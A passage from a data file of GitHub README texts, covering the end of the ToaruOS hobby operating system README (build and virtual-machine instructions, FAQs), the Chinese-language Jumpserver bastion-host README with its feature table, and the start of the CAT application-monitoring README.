have been successfully built with Clang using the `i686-elf` target. If you would like to experiment with using Clang to build ToaruOS, pass `USE_CLANG=1` to `make` from a clean build. You may confirm that Clang was used to build the kernel by examining `\/proc\/compiler` within the OS.\n\n### Building in ToaruOS\n\nToaruOS is self-hosting, though the native build environment is different from the hosted build.\n\nTo build ToaruOS from within ToaruOS, follow these steps:\n\n    # Install the necessary tools (gcc, python)\n    sudo msk update; sudo msk install src-tools\n    # Update PATH\n    source ~\/.eshrc; rehash\n    cd \/src\n    # Build the ISO (root is needed as this process copies some protected files from \/etc)\n    sudo build-the-world.py\n\nThe resulting image can be booted in Bochs, or sent to the host for use in another VM.\n\n### Third-Party Components\n\nPrior to ToaruOS 1.6.x, many third-party components were included by default (Python, libpng, zlib, Cairo, freetype, and so on). These are no longer part of the default distribution or build process and must be built manually. Complete guides for building these components are currently being drafted. The instructions for building Python are complete and [available from the wiki](https:\/\/github.com\/klange\/toaruos\/wiki\/How-to-Python) (note that a host installation of Python 3.6 is required to build Python 3.6 and satisfying this is left as an exercise to the reader).\n\nFreetype and Cairo have also been successfully built under the new in-house C library. When either of these are available, optional extension bindings may be built with `make ext-freetype` and `make ext-cairo` respectively. When the Freetype extension binding is available in the OS, alongside required Truetype font files, Freetype will be used to render text in several applications (including the terminal emulator, menus, and window decorations). When the Cairo extension binding is available, it is used by the compositor to provide improved performance.\n\n### Project Layout\n\n- **apps** - Userspace applications, all first-party.\n- **base** - Ramdisk root filesystem staging directory. Includes C headers in `base\/usr\/include`, as well as graphical resources for the compositor and window decorator.\n- **boot** - Bootloader, including BIOS and EFI IA32 and X64 support.\n- **cdrom** - Staging area for ISO9660 CD image, containing mostly blank shadow files for the FAT image.\n- **ext** - Optional runtime-loaded bindings for third-party libraries.\n- **fatbase** - Staging area for FAT image used by EFI.\n- **kernel** - The Toaru kernel.\n- **lib** - Userspace libraries.\n- **libc** - C standard library implementation.\n- **linker** - Userspace dynamic linker\/loader, implements shared library support.\n- **modules** - Kernel modules\/drivers.\n- **util** - Utility scripts, staging directory for the toolchain (binutils\/gcc).\n- **.make** - Generated Makefiles.\n\n## Running ToaruOS\n\nIt is highly recommended that interested users run ToaruOS from virtual machines. While we have done some testing on real hardware, driver support is still limited and virtual machines provide easily tested environments where we can guarantee some level of useful functionality.\n\nQEMU and VirtualBox are recommended and provide the most functonality. Audio support is not yet available in VMware. In VirtualBox and VMware, automatic guest display resizing is available (and a tool is available to provide similar functionality in QEMU). All three of the major VMs also support absolute mouse input.\n\n### QEMU\n\n1GB of RAM and an Intel AC'97 sound chip are recommended:\n\n```\nqemu-system-i386 -cdrom image.iso -serial mon:stdio -m 1G -soundhw ac97,pcspk -enable-kvm -rtc base=localtime\n```\n\nYou may also use OVMF with the appropriate QEMU system target. Our EFI loader supports both IA32 and X64 EFIs:\n\n```\nqemu-system-x86_64 -cdrom image.iso -serial mon:stdio -m 1G -soundhw ac97,pcspk -enable-kvm -rtc base=localtime \\\n  -bios \/usr\/share\/qemu\/OVMF.fd\n```\n\n```\nqemu-system-i386 -cdrom image.iso -serial mon:stdio -m 1G -soundhw ac97,pcspk -enable-kvm -rtc base=localtime \\\n  -bios \/path\/to\/OVMFia32.fd\n```\n\nAdditionally, a tool is available for running QEMU, under specific environments, with automatic support for resizing the guest display resolution when the QEMU window changes size: `util\/qemu-harness.py`\n\n### VirtualBox\n\nToaruOS should function either as an \"Other\/Unknown\" guest or an \"Other\/Unknown 64-bit\" guest with EFI.\n\nAll network chipset options should work except for `virtio-net` (work on virtio drivers has not yet begun).\n\nIt is highly recommended, due to the existence of Guest Additions drivers, that you provide your VM with at least 32MB of video memory to support larger display resolutions - especially if you are using a 4K display.\n\nEnsure that the audio controller is set to ICH AC97 and that audio output is enabled (as it is disabled by default in some versions of VirtualBox).\n\nKeep the system chipset set to PIIX3 for best compatibility. 1GB of RAM is recommended.\n\n### VMWare\n\nSupport for VMWare is experimental, though it has improved significantly over the last year. Optional support is provided for VMware's automatic guest display sizing which can be enabled from the bootloader menu (note that the guest resize capability in VMware may be unstable - if your VM boots to an unresponsive black screen, try resetting or disabling the guest display resizing).\n\n- Create a virtual machine for a 64-bit guest. (ToaruOS is 32-bit, but this configuration selects some hardware defaults that are desirable)\n- Ensure the VM has 1GB of RAM.\n- It is recommended you remove the hard disk and the audio device.\n- For network settings, the NAT option is recommended.\n\n### Bochs\n\nUsing Bochs to run ToaruOS is not advised; however the following configuration options are recommended if you wish to try it:\n\n- Attach the CD and set it as a boot device.\n- Ensure that the `pcivga` device is enabled or ToaruOS will not be able to find the video card through PCI.\n- Provide at least 512MB of RAM to the guest.\n- If available, enable the `e1000` network device using the `slirp` backend.\n- Clock settings of `sync=realtime, time0=local, rtc_sync=1` are recommended.\n\n## Community\n\n### Mirrors\n\nToaruOS is regularly mirrored to multiple Git hosting sites.\n\n- Gitlab: [toaruos\/toaruos](https:\/\/gitlab.com\/toaruos\/toaruos)\n- GitHub: [klange\/toaruos](https:\/\/github.com\/klange\/toaruos)\n- Bitbucket: [klange\/toaruos](https:\/\/bitbucket.org\/klange\/toaruos)\n- ToaruOS.org: [klange\/toaruos](https:\/\/git.toaruos.org\/klange\/toaruos)\n\n### IRC\n\n`#toaruos` on Freenode (`irc.freenode.net`)\n\n## FAQs\n\n### Is ToaruOS self-hosting?\n\nWith a capable compiler toolchain, ToaruOS is able to build its own kernel, userspace, libraries, and bootloader, and turn these into a working ISO CD image.\n\nToaruOS is not currently capable of building most of its ports, due to a lack of a proper Posix shell and Make implementation. These are eventual goals of the project.\n\n### Is ToaruOS a Linux distribution?\n\nToaruOS is a completely independent project, and all code in this repository - which is the entire codebase of the operating system, including its kernel, bootloaders, libraries, and applications - is original, written by the ToaruOS developers over the course of eight years. The complete source history, going back to when ToaruOS was nothing more than a baremetal \"hello world\" can be tracked through this git repository.\n\nToaruOS has taken inspiration from Linux in its choice of binary formats, filesystems, and its approach to kernel modules, but is not derived in any way from Linux code. ToaruOS's userspace is also influenced by the GNU utilities, but does not incorporate any GNU code.\n\n### Are there plans for a 64-bit port \/ SMP support?\n\nWith the development of ToaruOS's \"NIH\" branch, a secondary goal in removing third-party dependencies was to make the operating system more viable for a 64-bit port. That said, the actual development of a 64-bit kernel is currently on pause while other goals are pursued. Due to the limited size of the development team, it is not feasible to continue work on the 64-bit kernel at this time.\n\nSMP support likely poses a larger challenge as the early toy design for ToaruOS did not take into account multiprocessor systems and thus many challenges exist in getting the kernel to a functioning state with SMP.\n"},{"repo":"\/jumpserver\/jumpserver","language":"JavaScript","readme_contents":"# Jumpserver \u591a\u4e91\u73af\u5883\u4e0b\u66f4\u597d\u7528\u7684\u5821\u5792\u673a\n\n[![Python3](https:\/\/img.shields.io\/badge\/python-3.6-green.svg?style=plastic)](https:\/\/www.python.org\/)\n[![Django](https:\/\/img.shields.io\/badge\/django-2.1-brightgreen.svg?style=plastic)](https:\/\/www.djangoproject.com\/)\n[![Ansible](https:\/\/img.shields.io\/badge\/ansible-2.4.2.0-blue.svg?style=plastic)](https:\/\/www.ansible.com\/)\n[![Paramiko](https:\/\/img.shields.io\/badge\/paramiko-2.4.1-green.svg?style=plastic)](http:\/\/www.paramiko.org\/)\n\nJumpserver \u662f\u5168\u7403\u9996\u6b3e\u5b8c\u5168\u5f00\u6e90\u7684\u5821\u5792\u673a\uff0c\u4f7f\u7528 GNU GPL v2.0 \u5f00\u6e90\u534f\u8bae\uff0c\u662f\u7b26\u5408 4A \u673a\u5236\u7684\u8fd0\u7ef4\u5b89\u5168\u5ba1\u8ba1\u7cfb\u7edf\u3002\n\nJumpserver \u4f7f\u7528 Python \/ Django \u8fdb\u884c\u5f00\u53d1\uff0c\u9075\u5faa Web 2.0 \u89c4\u8303\uff0c\u914d\u5907\u4e86\u4e1a\u754c\u9886\u5148\u7684 Web Terminal \u65b9\u6848\uff0c\u4ea4\u4e92\u754c\u9762\u7f8e\u89c2\u3001\u7528\u6237\u4f53\u9a8c\u597d\u3002\n\nJumpserver \u91c7\u7eb3\u5206\u5e03\u5f0f\u67b6\u6784\uff0c\u652f\u6301\u591a\u673a\u623f\u8de8\u533a\u57df\u90e8\u7f72\uff0c\u652f\u6301\u6a2a\u5411\u6269\u5c55\uff0c\u65e0\u8d44\u4ea7\u6570\u91cf\u53ca\u5e76\u53d1\u9650\u5236\u3002\n\n\u6539\u53d8\u4e16\u754c\uff0c\u4ece\u4e00\u70b9\u70b9\u5f00\u59cb\u3002\n\n\u6ce8: [KubeOperator](https:\/\/github.com\/KubeOperator\/KubeOperator) \u662f Jumpserver \u56e2\u961f\u5728 Kubernetes \u9886\u57df\u7684\u7684\u53c8\u4e00\u5168\u65b0\u529b\u4f5c\uff0c\u6b22\u8fce\u5173\u6ce8\u548c\u4f7f\u7528\u3002\n\n## \u6838\u5fc3\u529f\u80fd\u5217\u8868\n\n<table class=\"subscription-level-table\">\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-first-td-background-style\" rowspan=\"4\">\u8eab\u4efd\u9a8c\u8bc1 Authentication<\/td>\n        <td class=\"features-second-td-background-style\" rowspan=\"3\" >\u767b\u5f55\u8ba4\u8bc1\n        <\/td>\n        <td class=\"features-third-td-background-style\">\u8d44\u6e90\u7edf\u4e00\u767b\u5f55\u548c\u8ba4\u8bc1\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-third-td-background-style\">LDAP \u8ba4\u8bc1\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-third-td-background-style\">\u652f\u6301 OpenID\uff0c\u5b9e\u73b0\u5355\u70b9\u767b\u5f55\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-second-td-background-style\">\u591a\u56e0\u5b50\u8ba4\u8bc1\n        <\/td>\n        <td class=\"features-third-td-background-style\">MFA\uff08Google Authenticator\uff09\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-first-td-background-style\" rowspan=\"9\">\u8d26\u53f7\u7ba1\u7406 Account<\/td>\n        <td class=\"features-second-td-background-style\" rowspan=\"2\">\u96c6\u4e2d\u8d26\u53f7\u7ba1\u7406\n        <\/td>\n        <td class=\"features-third-td-background-style\">\u7ba1\u7406\u7528\u6237\u7ba1\u7406\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-third-td-background-style\">\u7cfb\u7edf\u7528\u6237\u7ba1\u7406\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-second-td-background-style\" rowspan=\"4\">\u7edf\u4e00\u5bc6\u7801\u7ba1\u7406\n        <\/td>\n        <td class=\"features-third-td-background-style\">\u8d44\u4ea7\u5bc6\u7801\u6258\u7ba1\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-third-td-background-style\">\u81ea\u52a8\u751f\u6210\u5bc6\u7801\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-third-td-background-style\">\u5bc6\u7801\u81ea\u52a8\u63a8\u9001\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-third-td-background-style\">\u5bc6\u7801\u8fc7\u671f\u8bbe\u7f6e\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-outline-td-background-style\" rowspan=\"2\">\u6279\u91cf\u5bc6\u7801\u53d8\u66f4(X-PACK)\n        <\/td>\n        <td class=\"features-outline-td-background-style\">\u5b9a\u671f\u6279\u91cf\u4fee\u6539\u5bc6\u7801\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-outline-td-background-style\">\u751f\u6210\u968f\u673a\u5bc6\u7801\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-outline-td-background-style\">\u591a\u4e91\u73af\u5883\u7684\u8d44\u4ea7\u7eb3\u7ba1(X-PACK)\n        <\/td>\n        <td class=\"features-outline-td-background-style\">\u5bf9\u79c1\u6709\u4e91\u3001\u516c\u6709\u4e91\u8d44\u4ea7\u7edf\u4e00\u7eb3\u7ba1\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-first-td-background-style\" rowspan=\"9\">\u6388\u6743\u63a7\u5236 Authorization<\/td>\n        <td class=\"features-second-td-background-style\" rowspan=\"3\">\u8d44\u4ea7\u6388\u6743\u7ba1\u7406\n        <\/td>\n        <td class=\"features-third-td-background-style\">\u8d44\u4ea7\u6811\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-third-td-background-style\">\u8d44\u4ea7\u6216\u8d44\u4ea7\u7ec4\u7075\u6d3b\u6388\u6743\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-third-td-background-style\">\u8282\u70b9\u5185\u8d44\u4ea7\u81ea\u52a8\u7ee7\u627f\u6388\u6743\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-outline-td-background-style\">RemoteApp(X-PACK)\n        <\/td>\n        <td class=\"features-outline-td-background-style\">\u5b9e\u73b0\u66f4\u7ec6\u7c92\u5ea6\u7684\u5e94\u7528\u7ea7\u6388\u6743\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-outline-td-background-style\">\u7ec4\u7ec7\u7ba1\u7406(X-PACK)\n        <\/td>\n        <td class=\"features-outline-td-background-style\">\u5b9e\u73b0\u591a\u79df\u6237\u7ba1\u7406\uff0c\u6743\u9650\u9694\u79bb\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-second-td-background-style\">\u591a\u7ef4\u5ea6\u6388\u6743\n        <\/td>\n        <td class=\"features-third-td-background-style\">\u53ef\u5bf9\u7528\u6237\u3001\u7528\u6237\u7ec4\u6216\u7cfb\u7edf\u89d2\u8272\u6388\u6743\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-second-td-background-style\">\u6307\u4ee4\u9650\u5236\n        <\/td>\n        <td class=\"features-third-td-background-style\">\u9650\u5236\u7279\u6743\u6307\u4ee4\u4f7f\u7528\uff0c\u652f\u6301\u9ed1\u767d\u540d\u5355\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-second-td-background-style\">\u7edf\u4e00\u6587\u4ef6\u4f20\u8f93\n        <\/td>\n        <td class=\"features-third-td-background-style\">SFTP \u6587\u4ef6\u4e0a\u4f20\/\u4e0b\u8f7d\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-second-td-background-style\">\u6587\u4ef6\u7ba1\u7406\n        <\/td>\n        <td class=\"features-third-td-background-style\">Web SFTP \u6587\u4ef6\u7ba1\u7406\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-first-td-background-style\" rowspan=\"6\">\u5b89\u5168\u5ba1\u8ba1 Audit<\/td>\n        <td class=\"features-second-td-background-style\" rowspan=\"2\">\u4f1a\u8bdd\u7ba1\u7406\n        <\/td>\n        <td class=\"features-third-td-background-style\">\u5728\u7ebf\u4f1a\u8bdd\u7ba1\u7406\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-third-td-background-style\">\u5386\u53f2\u4f1a\u8bdd\u7ba1\u7406\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-second-td-background-style\" rowspan=\"2\">\u5f55\u50cf\u7ba1\u7406\n        <\/td>\n        <td class=\"features-third-td-background-style\">Linux \u5f55\u50cf\u652f\u6301\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-third-td-background-style\">Windows \u5f55\u50cf\u652f\u6301\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-second-td-background-style\">\u6307\u4ee4\u5ba1\u8ba1\n        <\/td>\n        <td class=\"features-third-td-background-style\">\u6307\u4ee4\u8bb0\u5f55\n        <\/td>\n    <\/tr>\n    <tr class=\"subscription-level-tr-border\">\n        <td class=\"features-second-td-background-style\">\u6587\u4ef6\u4f20\u8f93\u5ba1\u8ba1\n        <\/td>\n        <td class=\"features-third-td-background-style\">\u4e0a\u4f20\/\u4e0b\u8f7d\u8bb0\u5f55\u5ba1\u8ba1\n        <\/td>\n    <\/tr>\n<\/table>\n\n## \u5b89\u88c5\u53ca\u4f7f\u7528\u6307\u5357\n\n-  [Docker \u5feb\u901f\u5b89\u88c5\u6587\u6863](http:\/\/docs.jumpserver.org\/zh\/docs\/dockerinstall.html)\n-  [Step by Step \u5b89\u88c5\u6587\u6863](http:\/\/docs.jumpserver.org\/zh\/docs\/step_by_step.html)\n-  [\u5b8c\u6574\u6587\u6863](http:\/\/docs.jumpserver.org)\n\n## \u6f14\u793a\u89c6\u9891\u548c\u622a\u5c4f\n\n\u6211\u4eec\u63d0\u4f9b\u4e86\u6f14\u793a\u89c6\u9891\u548c\u7cfb\u7edf\u622a\u56fe\u53ef\u4ee5\u8ba9\u4f60\u5feb\u901f\u4e86\u89e3 Jumpserver\uff1a\n\n- [\u6f14\u793a\u89c6\u9891](https:\/\/jumpserver.oss-cn-hangzhou.aliyuncs.com\/jms-media\/%E3%80%90%E6%BC%94%E7%A4%BA%E8%A7%86%E9%A2%91%E3%80%91Jumpserver%20%E5%A0%A1%E5%9E%92%E6%9C%BA%20V1.5.0%20%E6%BC%94%E7%A4%BA%E8%A7%86%E9%A2%91%20-%20final.mp4)\n- [\u7cfb\u7edf\u622a\u56fe](http:\/\/docs.jumpserver.org\/zh\/docs\/snapshot.html)\n\n## SDK\n\n\u6211\u4eec\u7f16\u5199\u4e86\u4e00\u4e9bSDK\uff0c\u4f9b\u60a8\u7684\u5176\u5b83\u7cfb\u7edf\u5feb\u901f\u548c Jumpserver API \u4ea4\u4e92\uff1a\n\n- [Python](https:\/\/github.com\/jumpserver\/jumpserver-python-sdk) Jumpserver \u5176\u5b83\u7ec4\u4ef6\u4f7f\u7528\u8fd9\u4e2a SDK \u5b8c\u6210\u4ea4\u4e92\n- [Java](https:\/\/github.com\/KaiJunYan\/jumpserver-java-sdk.git) \u607a\u73fa\u540c\u5b66\u63d0\u4f9b\u7684 Java \u7248\u672c\u7684 SDK\n\n## License & Copyright\n\nCopyright (c) 2014-2019 \u98de\u81f4\u4e91 FIT2CLOUD, All rights reserved.\n\nLicensed under The GNU General Public License version 2 (GPLv2)  (the \"License\"); you may not use this file except in compliance with the License. You may obtain a copy of the License at\n\nhttps:\/\/www.gnu.org\/licenses\/gpl-2.0.html\n\nUnless required by applicable law or agreed to in writing, software distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License.\n"},{"repo":"\/dianping\/cat","language":"Java","readme_contents":"<img src=\"https:\/\/github.com\/dianping\/cat\/raw\/master\/cat-home\/src\/main\/webapp\/images\/logo\/cat_logo03.png\" width=\"50%\">\n\n**CAT**\n [![GitHub stars](https:\/\/img.shields.io\/github\/stars\/dianping\/cat.svg?style=social&label=Star&)](https:\/\/github.com\/dianping\/cat\/stargazers)\n [![GitHub forks](https:\/\/img.shields.io\/github\/forks\/dianping\/cat.svg?style=social&label=Fork&)](https:\/\/github.com\/dianping\/cat\/fork)\n\n### CAT \u7b80\u4ecb \n\n- CAT \u662f\u57fa\u4e8e Java \u5f00\u53d1\u7684\u5b9e\u65f6\u5e94\u7528\u76d1\u63a7\u5e73\u53f0\uff0c\u4e3a\u7f8e\u56e2\u70b9\u8bc4\u63d0\u4f9b\u4e86\u5168\u9762\u7684\u5b9e\u65f6\u76d1\u63a7\u544a\u8b66\u670d\u52a1\u3002\n- CAT \u4f5c\u4e3a\u670d\u52a1\u7aef\u9879\u76ee\u57fa\u7840\u7ec4\u4ef6\uff0c\u63d0\u4f9b\u4e86 Java, C\/C++, Node.js, Python, Go \u7b49\u591a\u8bed\u8a00\u5ba2\u6237\u7aef\uff0c\u5df2\u7ecf\u5728\u7f8e\u56e2\u70b9\u8bc4\u7684\u57fa\u7840\u67b6\u6784\u4e2d\u95f4\u4ef6\u6846\u67b6\uff08MVC\u6846\u67b6\uff0cRPC\u6846\u67b6\uff0c\u6570\u636e\u5e93\u6846\u67b6\uff0c\u7f13\u5b58\u6846\u67b6\u7b49\uff0c\u6d88\u606f\u961f\u5217\uff0c\u914d\u7f6e\u7cfb\u7edf\u7b49\uff09\u6df1\u5ea6\u96c6\u6210\uff0c\u4e3a\u7f8e\u56e2\u70b9\u8bc4\u5404\u4e1a\u52a1\u7ebf\u63d0\u4f9b\u7cfb\u7edf\u4e30\u5bcc\u7684\u6027\u80fd\u6307\u6807\u3001\u5065\u5eb7\u72b6\u51b5\u3001\u5b9e\u65f6\u544a\u8b66\u7b49\u3002\n- CAT \u5f88\u5927\u7684\u4f18\u52bf\u662f\u5b83\u662f\u4e00\u4e2a\u5b9e\u65f6\u7cfb\u7edf\uff0cCAT \u5927\u90e8\u5206\u7cfb\u7edf\u662f\u5206\u949f\u7ea7\u7edf\u8ba1\uff0c\u4f46\u662f\u4ece\u6570\u636e\u751f\u6210\u5230\u670d\u52a1\u7aef\u5904\u7406\u7ed3\u675f\u662f\u79d2\u7ea7\u522b\uff0c\u79d2\u7ea7\u5b9a\u4e49\u662f48\u5206\u949f40\u79d2\uff0c\u57fa\u672c\u4e0a\u770b\u523048\u5206\u949f38\u79d2\u6570\u636e\uff0c\u6574\u4f53\u62a5\u8868\u7684\u7edf\u8ba1\u7c92\u5ea6\u662f\u5206\u949f\u7ea7\uff1b\u7b2c\u4e8c\u4e2a\u4f18\u52bf\uff0c\u76d1\u63a7\u6570\u636e\u662f\u5168\u91cf\u7edf\u8ba1\uff0c\u5ba2\u6237\u7aef\u9884\u8ba1\u7b97\uff1b\u94fe\u8def\u6570\u636e\u662f\u91c7\u6837\u8ba1\u7b97\u3002\n\n### Cat \u4ea7\u54c1\u4ef7\u503c\n\n- \u51cf\u5c11\u6545\u969c\u53d1\u73b0\u65f6\u95f4\n- \u964d\u4f4e\u6545\u969c\u5b9a\u4f4d\u6210\u672c\n- \u8f85\u52a9\u5e94\u7528\u7a0b\u5e8f\u4f18\u5316\n\n### Cat \u4f18\u52bf\n\n- \u5b9e\u65f6\u5904\u7406\uff1a\u4fe1\u606f\u7684\u4ef7\u503c\u4f1a\u968f\u65f6\u95f4\u9510\u51cf\uff0c\u5c24\u5176\u662f\u4e8b\u6545\u5904\u7406\u8fc7\u7a0b\u4e2d\n- \u5168\u91cf\u6570\u636e\uff1a\u5168\u91cf\u91c7\u96c6\u6307\u6807\u6570\u636e\uff0c\u4fbf\u4e8e\u6df1\u5ea6\u5206\u6790\u6545\u969c\u6848\u4f8b\n- \u9ad8\u53ef\u7528\uff1a\u6545\u969c\u7684\u8fd8\u539f\u4e0e\u95ee\u9898\u5b9a\u4f4d\uff0c\u9700\u8981\u9ad8\u53ef\u7528\u76d1\u63a7\u6765\u652f\u6491\n- \u6545\u969c\u5bb9\u5fcd\uff1a\u6545\u969c\u4e0d\u5f71\u54cd\u4e1a\u52a1\u6b63\u5e38\u8fd0\u8f6c\u3001\u5bf9\u4e1a\u52a1\u900f\u660e\n- \u9ad8\u541e\u5410\uff1a\u6d77\u91cf\u76d1\u63a7\u6570\u636e\u7684\u6536\u96c6\uff0c\u9700\u8981\u9ad8\u541e\u5410\u80fd\u529b\u505a\u4fdd\u8bc1\n- \u53ef\u6269\u5c55\uff1a\u652f\u6301\u5206\u5e03\u5f0f\u3001\u8de8 IDC \u90e8\u7f72\uff0c\u6a2a\u5411\u6269\u5c55\u7684\u76d1\u63a7\u7cfb\u7edf\n\n### \u66f4\u65b0\u65e5\u5fd7\n\n- [**\u6700\u65b0\u7248\u672c\u7279\u6027\u4e00\u89c8**](https:\/\/github.com\/dianping\/cat\/wiki\/new)\n\n    - \u6ce8\u610fcat\u76843.0\u4ee3\u7801\u5206\u652f\u66f4\u65b0\u90fd\u53d1\u5e03\u5728master\u4e0a\uff0c\u5305\u62ec\u6700\u65b0\u6587\u6863\u4e5f\u90fd\u662f\u8fd9\u4e2a\u5206\u652f\n    - \u6ce8\u610f\u6587\u6863\u8bf7\u7528\u6700\u65b0master\u91cc\u9762\u7684\u4ee3\u7801\u6587\u6863\u4f5c\u4e3a\u6807\u51c6\uff0c\u4e00\u4e9b\u5f00\u6e90\u7f51\u7ad9\u4e0a\u9762\u4e00\u4e9b\u8001\u7248\u672c\u7684\u4e00\u4e9b\u914d\u7f6e\u5305\u62ec\u6570\u636e\u5e93\u7b49\u53ef\u80fd\u9047\u5230\u4e0d\u517c\u5bb9\u60c5\u51b5\uff0c\u8bf7\u4ee5master\u4ee3\u7801\u4e3a\u51c6\uff0c\u8fd9\u4efd\u6587\u6863\u90fd\u662f\u7f8e\u56e2\u70b9\u8bc4\u5185\u90e8\u540c\u5b66\u4e3a\u8fd9\u4e2a\u7248\u672c\u7edf\u4e00\u6574\u7406\u6c47\u603b\u3002\u5185\u90e8\u540c\u5b66\u5df2\u7ecf\u6838\u5bf9\uff0c\u5305\u62ec\u4e5f\u9a8c\u8bc1\u8fc7\uff0c\u5982\u679c\u9047\u5230\u4e00\u4e9b\u770b\u4e0d\u61c2\uff0c\u6216\u8005\u6a21\u7cca\u7684\u5730\u65b9\uff0c\u6b22\u8fce\u63d0\u4ea4PR\u3002\n    - \u591a\u8bed\u8a00\u5ba2\u6237\u7aef\uff1aJava\u3001C\/C++\u3001Node.js\u3001Python\u3001Go [\u4f20\u9001\u95e8](https:\/\/github.com\/dianping\/cat\/tree\/master\/lib)\n        \n        * [**Java**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/java)\n        * [**C**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/c)\n        * [**C++**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/cpp)\n        * [**Python**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/python)\n        * [**Go**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/go)\n        * [**Node.js**](https:\/\/github.com\/dianping\/cat\/blob\/master\/lib\/node.js)\n        \n    - \u6d88\u606f\u91c7\u6837\u805a\u5408\n    - \u5e8f\u5217\u5316\u534f\u8bae\u5347\u7ea7\n    - \u5168\u65b0\u6587\u4ef6\u5b58\u50a8\u5f15\u64ce\n   \n\n### \u76d1\u63a7\u6a21\u578b\uff1a\n\n\u652f\u6301 Transaction\u3001Event\u3001Heartbeat\u3001Metric \u56db\u79cd\u6d88\u606f\u6a21\u578b\u3002 [**\u6a21\u578b\u8bbe\u8ba1**](https:\/\/github.com\/dianping\/cat\/wiki\/model)\n\n### \u6a21\u5757\u7b80\u4ecb\n\n#### \u529f\u80fd\u6a21\u5757\n\n- cat-client: \u5ba2\u6237\u7aef\uff0c\u4e0a\u62a5\u76d1\u63a7\u6570\u636e\n- cat-consumer: \u670d\u52a1\u7aef\uff0c\u6536\u96c6\u76d1\u63a7\u6570\u636e\u8fdb\u884c\u7edf\u8ba1\u5206\u6790\uff0c\u6784\u5efa\u4e30\u5bcc\u7684\u7edf\u8ba1\u62a5\u8868\n- cat-alarm: \u5b9e\u65f6\u544a\u8b66\uff0c\u63d0\u4f9b\u62a5\u8868\u6307\u6807\u7684\u76d1\u63a7\u544a\u8b66\n- cat-hadoop: \u6570\u636e\u5b58\u50a8\uff0clogview \u5b58\u50a8\u81f3 Hdfs\n- cat-home: \u7ba1\u7406\u7aef\uff0c\u62a5\u8868\u5c55\u793a\u3001\u914d\u7f6e\u7ba1\u7406\u7b49\n\n> 1. \u6839\u76ee\u5f55\u4e0b cat-client \u6a21\u5757\u4ee5\u540e\u4e0d\u518d\u7ef4\u62a4\uff0c\u4e0b\u4e2a\u5927\u7248\u672c\u66f4\u65b0\u8ba1\u5212\u79fb\u9664\u3002\u65b0\u7248Java\u5ba2\u6237\u7aef\u53c2\u8003\uff1alib\/java\n> 2. \u7ba1\u7406\u7aef\u3001\u670d\u52a1\u7aef\u3001\u544a\u8b66\u670d\u52a1\u5747\u4f7f\u7528 cat-home \u6a21\u5757\u90e8\u7f72\u5373\u53ef\n\n#### \u5176\u4ed6\u6a21\u5757\n\n- integration\uff1acat\u548c\u4e00\u4e9b\u7b2c\u4e09\u65b9\u5de5\u5177\u96c6\u6210\u7684\u5185\u5bb9\uff08\u6b64\u90e8\u5206\u4e00\u90e8\u5206\u662f\u7531\u793e\u533a\u8d21\u732e\uff0c\u4e00\u90e8\u5206\u5b98\u65b9\u8d21\u732e\uff09\n- lib\uff1aCAT \u7684\u5ba2\u6237\u7aef\uff0c\u5305\u62ec Java\u3001C\/C++\u3001Python\u3001Node.js\u3001Go\n- script\uff1aCAT \u6570\u636e\u5e93\u811a\u672c\n\n### Quick Start\n\n- [\u90e8\u7f72FAQ](https:\/\/github.com\/dianping\/cat\/wiki\/cat_faq)\n\n#### \u670d\u52a1\u7aef\n\n- [\u96c6\u7fa4\u90e8\u7f72](https:\/\/github.com\/dianping\/cat\/wiki\/readme_server)\n- [\u62a5\u8868\u4ecb\u7ecd](https:\/\/github.com\/dianping\/cat\/wiki\/readme_report)\n- [\u914d\u7f6e\u624b\u518c](https:\/\/github.com\/dianping\/cat\/wiki\/readme_config)\n\n### \u9879\u76ee\u8bbe\u8ba1\n\n- 